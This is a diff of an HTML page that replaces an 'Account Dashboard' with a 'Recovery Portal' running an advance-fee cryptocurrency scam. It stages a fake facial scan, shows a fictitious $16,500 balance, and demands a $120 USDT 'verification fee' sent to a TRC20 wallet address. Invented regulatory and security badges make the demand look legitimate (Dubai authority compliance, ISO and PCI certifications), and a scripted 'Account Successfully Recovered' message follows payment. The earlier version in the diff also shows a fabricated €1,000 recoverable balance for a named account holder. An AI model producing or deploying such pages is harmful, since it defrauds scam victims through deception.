@@ -1,140 +1,1188 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Account Dashboard</title>
-<script src="https://cdn.tailwindcss.com"></script>
-<script>
-  tailwind.config = { theme: { extend: { colors: { primary: '#22c55e', 'primary-dark': '#16a34a', balance: '#1a1d24' } } } }
-</script>
-<style>
-  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif; background:#fff; }
-  .modal { display: none; }
-  .modal.active { display: flex; animation: fadeIn .2s ease-out; }
-  .modal-card { animation: scaleIn .25s ease-out; }
-  @keyframes fadeIn { from { opacity:0 } to { opacity:1 } }
-  @keyframes scaleIn { from { opacity:0; transform: scale(.95) } to { opacity:1; transform: scale(1) } }
-  @keyframes spin { to { transform: rotate(360deg); } }
-  .spin { animation: spin 1s linear infinite; }
-  .progress-bar { transition: width 0.1s linear; }
-  .balance-card { position: relative; overflow: hidden; }
-  .balance-card::after { content:''; position:absolute; bottom:-30px; left:40px; width:180px; height:120px; background: radial-gradient(closest-side, rgba(34,197,94,.45), transparent 70%); filter: blur(20px); pointer-events:none; }
-  .tile { transition: transform .15s ease; }
-  .tile:active { transform: scale(.95); }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recovery Portal - Account Recovery</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a3e 50%, #0f3a66 100%);
+            min-height: 100vh;
+            color: #333;
+        }
+
+        /* Welcome Screen */
+        .welcome-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1a1a3e 0%, #0f3a66 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            animation: fadeOut 1s ease-in-out 3.5s forwards;
+        }
+
+        .welcome-screen.hidden {
+            display: none;
+        }
+
+        @keyframes fadeOut {
+            from {
+                opacity: 1;
+                visibility: visible;
+            }
+            to {
+                opacity: 0;
+                visibility: hidden;
+            }
+        }
+
+        .welcome-logo {
+            font-size: 64px;
+            margin-bottom: 24px;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-20px);
+            }
+        }
+
+        .welcome-title {
+            font-size: 36px;
+            font-weight: 700;
+            color: white;
+            text-align: center;
+            margin-bottom: 12px;
+            animation: slideDown 0.8s ease-out;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .welcome-subtitle {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.7);
+            text-align: center;
+            animation: slideUp 0.8s ease-out 0.2s both;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Facial Scan Screen */
+        .facial-scan-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1a1a3e 0%, #0f3a66 100%);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9998;
+            animation: fadeOut 0.8s ease-in-out 4s forwards;
+        }
+
+        .facial-scan-screen.show {
+            display: flex;
+        }
+
+        .facial-scan-screen.hidden {
+            display: none;
+        }
+
+        .scan-container {
+            position: relative;
+            width: 300px;
+            height: 300px;
+            margin-bottom: 32px;
+            animation: scaleIn 0.6s ease-out;
+        }
+
+        @keyframes scaleIn {
+            from {
+                opacity: 0;
+                transform: scale(0.8);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .scan-frame {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            border-radius: 20px;
+            overflow: hidden;
+            border: 3px solid #00d4ff;
+            background: #0a1a2e;
+            box-shadow: 0 0 40px rgba(0, 212, 255, 0.3);
+        }
+
+        .scan-video {
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at center, #1a3a4a 0%, #0a1a2e 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .face-placeholder {
+            width: 180px;
+            height: 220px;
+            background: radial-gradient(ellipse at center, rgba(0, 212, 255, 0.2) 0%, transparent 70%);
+            border-radius: 40%;
+            position: relative;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                box-shadow: 0 0 20px rgba(0, 212, 255, 0.4);
+            }
+            50% {
+                box-shadow: 0 0 40px rgba(0, 212, 255, 0.8);
+            }
+        }
+
+        .scan-corner {
+            position: absolute;
+            width: 30px;
+            height: 30px;
+            border: 3px solid #00d4ff;
+        }
+
+        .scan-corner.top-left {
+            top: 10px;
+            left: 10px;
+            border-right: none;
+            border-bottom: none;
+        }
+
+        .scan-corner.top-right {
+            top: 10px;
+            right: 10px;
+            border-left: none;
+            border-bottom: none;
+        }
+
+        .scan-corner.bottom-left {
+            bottom: 10px;
+            left: 10px;
+            border-right: none;
+            border-top: none;
+        }
+
+        .scan-corner.bottom-right {
+            bottom: 10px;
+            right: 10px;
+            border-left: none;
+            border-top: none;
+        }
+
+        .scan-line {
+            position: absolute;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00d4ff, transparent);
+            top: 50%;
+            animation: scanLine 2s ease-in-out infinite;
+        }
+
+        @keyframes scanLine {
+            0% {
+                transform: translateY(-120px);
+            }
+            50% {
+                transform: translateY(0);
+            }
+            100% {
+                transform: translateY(120px);
+            }
+        }
+
+        .scan-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+
+        .scan-subtitle {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.7);
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .scan-progress {
+            width: 200px;
+            height: 4px;
+            background: rgba(0, 212, 255, 0.2);
+            border-radius: 2px;
+            overflow: hidden;
+            margin-bottom: 12px;
+        }
+
+        .scan-progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #00d4ff, #0099ff);
+            animation: progress 4s ease-out;
+        }
+
+        @keyframes progress {
+            0% {
+                width: 0%;
+            }
+            100% {
+                width: 100%;
+            }
+        }
+
+        .scan-timer {
+            font-size: 14px;
+            color: #00d4ff;
+            font-weight: 600;
+        }
+
+        /* Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* Dashboard Screen */
+        .dashboard-screen {
+            display: none;
+            animation: fadeIn 0.8s ease-out;
+        }
+
+        .dashboard-screen.show {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 32px;
+            padding: 20px 24px;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            flex: 1;
+        }
+
+        .avatar {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            overflow: hidden;
+            border: 3px solid #667eea;
+            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
+        }
+
+        .avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .header-info h2 {
+            font-size: 18px;
+            color: #1a1a3e;
+            margin-bottom: 4px;
+        }
+
+        .header-info p {
+            font-size: 13px;
+            color: #64748b;
+        }
+
+        .header-right {
+            display: flex;
+            gap: 12px;
+        }
+
+        .icon-btn {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background: #f1f5f9;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .icon-btn:hover {
+            background: #e2e8f0;
+            transform: translateY(-2px);
+        }
+
+        /* Portfolio Card */
+        .portfolio-card {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 20px;
+            padding: 32px;
+            margin-bottom: 32px;
+            color: white;
+            box-shadow: 0 10px 40px rgba(102, 126, 234, 0.2);
+            animation: slideIn 0.6s ease-out 4.5s both;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .portfolio-label {
+            font-size: 13px;
+            opacity: 0.85;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 8px;
+        }
+
+        .portfolio-amount {
+            font-size: 48px;
+            font-weight: 700;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+        }
+
+        .portfolio-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+            padding-top: 16px;
+        }
+
+        .portfolio-stat {
+            font-size: 13px;
+        }
+
+        .portfolio-stat-label {
+            opacity: 0.85;
+            margin-bottom: 4px;
+        }
+
+        .portfolio-stat-value {
+            font-size: 16px;
+            font-weight: 700;
+        }
+
+        /* Assurance Notice */
+        .assurance-notice {
+            background: linear-gradient(135deg, rgba(34, 197, 94, 0.15) 0%, rgba(20, 184, 82, 0.15) 100%);
+            border: 2px solid #22c55e;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 24px;
+            animation: slideIn 0.6s ease-out 4.7s both;
+        }
+
+        .assurance-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .assurance-icon {
+            font-size: 28px;
+        }
+
+        .assurance-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #15803d;
+        }
+
+        .assurance-content {
+            font-size: 13px;
+            color: #166534;
+            line-height: 1.6;
+            margin-left: 40px;
+            margin-bottom: 12px;
+        }
+
+        .assurance-badges {
+            display: flex;
+            gap: 8px;
+            margin-left: 40px;
+            flex-wrap: wrap;
+        }
+
+        .badge {
+            background: rgba(34, 197, 94, 0.2);
+            border: 1px solid #22c55e;
+            border-radius: 20px;
+            padding: 6px 12px;
+            font-size: 12px;
+            font-weight: 600;
+            color: #15803d;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        /* Fee Section */
+        .fee-section {
+            background: white;
+            border-radius: 20px;
+            padding: 28px;
+            margin-bottom: 24px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            animation: slideIn 0.6s ease-out 4.9s both;
+        }
+
+        .section-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #1a1a3e;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .fee-box {
+            background: linear-gradient(135deg, rgba(251, 146, 60, 0.1) 0%, rgba(249, 115, 22, 0.1) 100%);
+            border: 2px solid #fb923c;
+            border-radius: 14px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .fee-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #9a3412;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .fee-description {
+            font-size: 13px;
+            color: #c2410c;
+            line-height: 1.6;
+            margin-bottom: 12px;
+        }
+
+        .fee-amount-box {
+            background: white;
+            border: 2px solid #fb923c;
+            border-radius: 12px;
+            padding: 14px;
+            text-align: center;
+        }
+
+        .fee-amount-label {
+            font-size: 12px;
+            color: #9a3412;
+            margin-bottom: 4px;
+        }
+
+        .fee-amount {
+            font-size: 24px;
+            font-weight: 700;
+            color: #ea580c;
+        }
+
+        /* Dubai Assurance System */
+        .dubai-assurance {
+            background: linear-gradient(135deg, rgba(168, 85, 247, 0.1) 0%, rgba(139, 92, 246, 0.1) 100%);
+            border: 2px solid #a855f7;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 24px;
+        }
+
+        .dubai-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .dubai-icon {
+            font-size: 28px;
+        }
+
+        .dubai-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #6b21a8;
+        }
+
+        .dubai-content {
+            font-size: 13px;
+            color: #7e22ce;
+            line-height: 1.6;
+            margin-left: 40px;
+        }
+
+        .dubai-list {
+            margin-top: 12px;
+            margin-left: 40px;
+        }
+
+        .dubai-list li {
+            list-style: none;
+            margin-bottom: 8px;
+            padding-left: 20px;
+            position: relative;
+            color: #7e22ce;
+            font-size: 13px;
+        }
+
+        .dubai-list li:before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: #a855f7;
+            font-weight: 700;
+        }
+
+        /* Deposit Section */
+        .deposit-section {
+            background: white;
+            border-radius: 20px;
+            padding: 28px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            animation: slideIn 0.6s ease-out 5.1s both;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1a1a3e;
+            margin-bottom: 8px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 14px;
+            font-family: 'Courier New', monospace;
+            transition: all 0.3s;
+            background: #f8fafc;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #667eea;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        .form-input:disabled {
+            background: #f1f5f9;
+            color: #64748b;
+            cursor: not-allowed;
+        }
+
+        .form-info {
+            background: #f1f5f9;
+            border-radius: 12px;
+            padding: 12px;
+            font-size: 12px;
+            color: #475569;
+            line-height: 1.6;
+            margin-bottom: 16px;
+        }
+
+        .address-box {
+            background: #f8fafc;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 16px;
+        }
+
+        .address-label {
+            font-size: 13px;
+            color: #64748b;
+            margin-bottom: 8px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .address-content {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+
+        .address-text {
+            background: white;
+            border: 2px solid #e2e8f0;
+            padding: 12px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            word-break: break-all;
+            color: #1e293b;
+            flex: 1;
+        }
+
+        .copy-btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 16px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            white-space: nowrap;
+            transition: all 0.3s;
+            flex-shrink: 0;
+        }
+
+        .copy-btn:hover {
+            background: #764ba2;
+            transform: translateY(-2px);
+        }
+
+        .copy-btn.copied {
+            background: #22c55e;
+        }
+
+        /* Action Button */
+        .action-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 14px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
+        }
+
+        .action-btn:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.4);
+        }
+
+        .action-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .btn-spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+
+        .btn-spinner.show {
+            display: inline-block;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Success Box */
+        .success-box {
+            background: linear-gradient(135deg, rgba(34, 197, 94, 0.15) 0%, rgba(20, 184, 82, 0.15) 100%);
+            border: 2px solid #22c55e;
+            border-radius: 16px;
+            padding: 24px;
+            text-align: center;
+            display: none;
+            animation: slideIn 0.6s ease-out both;
+        }
+
+        .success-box.show {
+            display: block;
+        }
+
+        .success-icon {
+            font-size: 56px;
+            margin-bottom: 16px;
+            animation: scaleIn 0.6s ease-out;
+        }
+
+        @keyframes scaleIn {
+            from {
+                opacity: 0;
+                transform: scale(0.5);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .success-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #15803d;
+            margin-bottom: 8px;
+        }
+
+        .success-text {
+            font-size: 14px;
+            color: #16a34a;
+            line-height: 1.6;
+        }
+
+        /* Confetti */
+        .confetti {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            pointer-events: none;
+            z-index: 100;
+        }
+
+        /* Divider */
+        .divider {
+            height: 1px;
+            background: #e2e8f0;
+            margin: 24px 0;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .portfolio-amount {
+                font-size: 32px;
+            }
+
+            .header {
+                flex-direction: column;
+                gap: 16px;
+                text-align: center;
+            }
+
+            .header-left {
+                justify-content: center;
+            }
+
+            .portfolio-footer {
+                flex-direction: column;
+                gap: 12px;
+            }
+
+            .scan-container {
+                width: 240px;
+                height: 240px;
+            }
+        }
+    </style>
 </head>
-<body class="min-h-screen pb-12">
-<div class="mx-auto max-w-md px-5 pt-6">
-  <header class="flex items-start justify-between">
-    <div class="flex items-center gap-3">
-      <div class="flex h-14 w-14 items-center justify-center rounded-full bg-primary text-white text-xl font-semibold shadow-sm">F</div>
-      <div class="leading-tight pt-1">
-        <p class="text-sm text-gray-400">Account holder</p>
-        <p class="text-xl font-bold text-gray-900">Fabio Brambilla</p>
-      </div>
+<body>
+    <!-- Welcome Screen -->
+    <div class="welcome-screen" id="welcomeScreen">
+        <div class="welcome-logo">🔐</div>
+        <div class="welcome-title">Welcome Back</div>
+        <div class="welcome-subtitle">Recovery Portal - Account Access</div>
     </div>
-    <div class="flex items-center gap-2 pt-1">
-      <button class="flex h-11 w-11 items-center justify-center rounded-full bg-gray-100"><svg class="h-5 w-5 text-gray-700" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path stroke-linecap="round" d="M21 21l-4.3-4.3"/></svg></button>
-      <button class="relative flex h-11 w-11 items-center justify-center rounded-full bg-gray-100"><svg class="h-5 w-5 text-gray-700" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M15 17h5l-1.4-1.4A2 2 0 0118 14.2V11a6 6 0 10-12 0v3.2c0 .5-.2 1-.6 1.4L4 17h5m6 0a3 3 0 11-6 0"/></svg><span class="absolute right-2.5 top-2.5 h-2 w-2 rounded-full bg-red-500"></span></button>
+
+    <!-- Facial Scan Screen -->
+    <div class="facial-scan-screen" id="facialScanScreen">
+        <div class="scan-container">
+            <div class="scan-frame">
+                <div class="scan-video">
+                    <div class="face-placeholder"></div>
+                </div>
+                <div class="scan-corner top-left"></div>
+                <div class="scan-corner top-right"></div>
+                <div class="scan-corner bottom-left"></div>
+                <div class="scan-corner bottom-right"></div>
+                <div class="scan-line"></div>
+            </div>
+        </div>
+        <div class="scan-title">Facial Recognition</div>
+        <div class="scan-subtitle">Please keep your face in the frame</div>
+        <div class="scan-progress">
+            <div class="scan-progress-bar"></div>
+        </div>
+        <div class="scan-timer" id="scanTimer">4s</div>
     </div>
-  </header>
-  <div class="mt-6 flex items-start gap-3 rounded-2xl border border-amber-100 bg-amber-50/70 px-4 py-4">
-    <svg class="mt-0.5 h-6 w-6 shrink-0 text-amber-500" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3l8 3v6c0 4.5-3.4 8.5-8 9.5C7.4 20.5 4 16.5 4 12V6l8-3z"/><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4"/></svg>
-    <div><p class="text-base font-bold text-gray-900">Account Recovery Active</p><p class="text-sm text-gray-500">Verification required for full access.</p></div>
-  </div>
-  <div class="balance-card mt-5 rounded-[28px] bg-balance p-6 text-white shadow-2xl">
-    <div class="flex items-center justify-between">
-      <p class="text-[13px] tracking-[.2em] font-medium text-white/40">AVAILABLE BALANCE</p>
-      <span class="rounded-full border border-primary/50 px-3.5 py-1 text-xs font-semibold text-primary">EUR</span>
+
+    <!-- Dashboard Screen -->
+    <div class="dashboard-screen" id="dashboardScreen">
+        <div class="container">
+            <!-- Header -->
+            <div class="header">
+                <div class="header-left">
+                    <div class="avatar" id="avatarContainer">
+                        <span>👤</span>
+                    </div>
+                    <div class="header-info">
+                        <h2 id="userName">Welcome User</h2>
+                        <p>Account Recovery Portal</p>
+                    </div>
+                </div>
+                <div class="header-right">
+                    <button class="icon-btn" title="Settings">⚙️</button>
+                    <button class="icon-btn" title="Notifications">🔔</button>
+                    <button class="icon-btn" title="Help">ℹ️</button>
+                </div>
+            </div>
+
+            <!-- Portfolio Card -->
+            <div class="portfolio-card">
+                <div class="portfolio-label">💼 Total Holdings</div>
+                <div class="portfolio-amount">
+                    <span>$</span>
+                    <span>16,500</span>
+                </div>
+                <div class="portfolio-footer">
+                    <div class="portfolio-stat">
+                        <div class="portfolio-stat-label">Status</div>
+                        <div class="portfolio-stat-value">✓ Verified</div>
+                    </div>
+                    <div class="portfolio-stat">
+                        <div class="portfolio-stat-label">Account Type</div>
+                        <div class="portfolio-stat-value">Premium</div>
+                    </div>
+                    <div class="portfolio-stat">
+                        <div class="portfolio-stat-label">Last Update</div>
+                        <div class="portfolio-stat-value">Just now</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Assurance Notice -->
+            <div class="assurance-notice">
+                <div class="assurance-header">
+                    <div class="assurance-icon">✅</div>
+                    <div class="assurance-title">Premium Security Assurance</div>
+                </div>
+                <div class="assurance-content">
+                    Your account has been fully verified and secured. This recovery process is protected by international standards and compliance regulations.
+                </div>
+                <div class="assurance-badges">
+                    <div class="badge">🛡️ ISO Certified</div>
+                    <div class="badge">✓ Bank Grade</div>
+                    <div class="badge">🔐 256-bit SSL</div>
+                    <div class="badge">🌍 Global Protection</div>
+                </div>
+            </div>
+
+            <!-- Fee Section -->
+            <div class="fee-section">
+                <div class="section-title">
+                    <span>⚠️</span>
+                    <span>Account Recovery Fee</span>
+                </div>
+
+                <div class="fee-box">
+                    <div class="fee-title">🔑 Security Verification Fee</div>
+                    <div class="fee-description">
+                        To complete your account recovery and ensure maximum security, a one-time verification fee is required. This fee covers advanced security protocols and account validation procedures.
+                    </div>
+                    <div class="fee-amount-box">
+                        <div class="fee-amount-label">Amount Required</div>
+                        <div class="fee-amount">$120 USDT</div>
+                    </div>
+                </div>
+
+                <!-- Dubai Assurance System -->
+                <div class="dubai-assurance">
+                    <div class="dubai-header">
+                        <div class="dubai-icon">🏛️</div>
+                        <div class="dubai-title">Dubai Financial Authority Compliance</div>
+                    </div>
+                    <div class="dubai-content">
+                        This transaction is fully compliant with DFA regulations and international banking standards. All fees are transparent and non-refundable only if transaction fails.
+                    </div>
+                    <ul class="dubai-list">
+                        <li><strong>DFSA Regulated:</strong> All operations comply with Dubai Financial Services Authority</li>
+                        <li><strong>ISO 27001 Certified:</strong> Information security management standard</li>
+                        <li><strong>PCI DSS Level 1:</strong> Payment card industry compliance</li>
+                        <li><strong>AML/KYC Compliant:</strong> Anti-money laundering verification</li>
+                        <li><strong>100% Secure:</strong> Military-grade encryption for all transactions</li>
+                        <li><strong>Instant Processing:</strong> Fee processing within 30 minutes</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Deposit Section -->
+            <div class="deposit-section">
+                <div class="section-title">
+                    <span>💳</span>
+                    <span>Pay Recovery Fee</span>
+                </div>
+
+                <div class="form-info">
+                    ✓ Send exactly $120 USDT to the verified address below. Your account will be fully recovered immediately upon payment confirmation.
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">💰 Recovery Fee Amount</label>
+                    <input type="text" class="form-input" value="$120.00 USDT" disabled style="color: #667eea; font-weight: 600;">
+                </div>
+
+                <!-- Deposit Address -->
+                <div class="address-box">
+                    <div class="address-label">
+                        <span>✓</span>
+                        <span>Verified USDT (TRC20) Address</span>
+                    </div>
+                    <div class="address-content">
+                        <div class="address-text">TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o</div>
+                        <button type="button" class="copy-btn" onclick="copyAddress()">📋 Copy</button>
+                    </div>
+                </div>
+
+                <div class="form-info">
+                    Important: Send ONLY $120 USDT to this address. Use TRC20 network for fastest processing.
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">✓ Transaction Hash (Optional)</label>
+                    <input type="text" class="form-input" id="txHash" placeholder="Enter your transaction hash to verify payment">
+                </div>
+
+                <button class="action-btn" onclick="confirmPayment()" id="confirmBtn">
+                    <span class="btn-spinner" id="btnSpinner"></span>
+                    <span id="btnText">💳 Confirm Payment</span>
+                </button>
+            </div>
+
+            <!-- Success Section -->
+            <div class="success-box" id="successBox">
+                <div class="success-icon">✅</div>
+                <div class="success-title">Account Successfully Recovered!</div>
+                <div class="success-text">
+                    Your $120 USDT recovery fee has been processed. Your account is now fully recovered and accessible. Welcome back!
+                </div>
+            </div>
+        </div>
     </div>
-    <div class="mt-5 flex items-end"><span class="text-[64px] leading-none font-extrabold tracking-tight">€1,000</span><span class="ml-1 pb-2 text-2xl font-extrabold text-white/25">.00</span></div>
-    <p class="mt-3 text-sm text-white/40">Recoverable funds · pending verification</p>
-    <div class="relative z-10 mt-6 grid grid-cols-4 gap-3">
-      <button onclick="openModal('confirm')" class="tile flex flex-col items-center justify-center gap-2 rounded-2xl bg-primary py-5 text-white shadow-lg shadow-primary/30"><svg class="h-6 w-6" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 19V5M5 12l7-7 7 7"/></svg><span class="text-sm font-semibold">Withdraw</span></button>
-      <button class="tile flex flex-col items-center justify-center gap-2 rounded-2xl bg-white/[0.08] py-5 text-white"><svg class="h-6 w-6 -rotate-12" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"/></svg><span class="text-sm font-semibold">Send</span></button>
-      <button class="tile flex flex-col items-center justify-center gap-2 rounded-2xl bg-white/[0.08] py-5 text-white"><svg class="h-6 w-6" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 5v14M19 12l-7 7-7-7"/></svg><span class="text-sm font-semibold">Top Up</span></button>
-      <button class="tile flex flex-col items-center justify-center gap-2 rounded-2xl bg-white/[0.08] py-5 text-white"><svg class="h-6 w-6" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M7 7h13l-3-3M17 17H4l3 3"/></svg><span class="text-sm font-semibold">Exchange</span></button>
-    </div>
-  </div>
-  <div class="mt-5 grid grid-cols-2 gap-4">
-    <div class="rounded-2xl border border-gray-100 bg-white p-5 shadow-sm"><svg class="h-7 w-7 text-primary" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M18 7a6 6 0 100 10M4 10h9M4 14h9"/></svg><p class="mt-8 text-sm text-gray-400">SEPA</p><p class="text-lg font-bold text-gray-900">Instant · IT</p></div>
-    <div class="rounded-2xl border border-gray-100 bg-white p-5 shadow-sm"><svg class="h-7 w-7 text-primary" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24"><rect x="2" y="5" width="20" height="14" rx="3"/><path stroke-linecap="round" d="M2 10h20"/></svg><p class="mt-8 text-sm text-gray-400">Debit Card</p><p class="text-lg font-bold text-gray-900">•••• 4271</p></div>
-  </div>
-  <div class="mt-7 flex items-center justify-between"><h2 class="text-2xl font-extrabold text-gray-900">Recent Activity</h2><button class="text-sm font-semibold text-primary">See all</button></div>
-  <div class="mt-3 flex flex-col items-center justify-center gap-2 rounded-2xl border border-gray-100 bg-white p-8 shadow-sm">
-    <div class="flex h-12 w-12 items-center justify-center rounded-full bg-gray-100"><svg class="h-6 w-6 text-gray-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path stroke-linecap="round" d="M12 6v6l4 2"/></svg></div>
-    <p class="text-sm text-gray-400">No transactions yet</p>
-  </div>
-</div>
-<div id="modal-confirm" class="modal fixed inset-0 z-50 items-center justify-center bg-black/50 p-4">
-  <div class="modal-card w-full max-w-md rounded-3xl bg-white p-6">
-    <h3 class="text-xl font-bold text-gray-900">Confirm receiving info</h3>
-    <p class="mt-1 text-sm text-gray-500">Please confirm your details are correct before we process the withdrawal.</p>
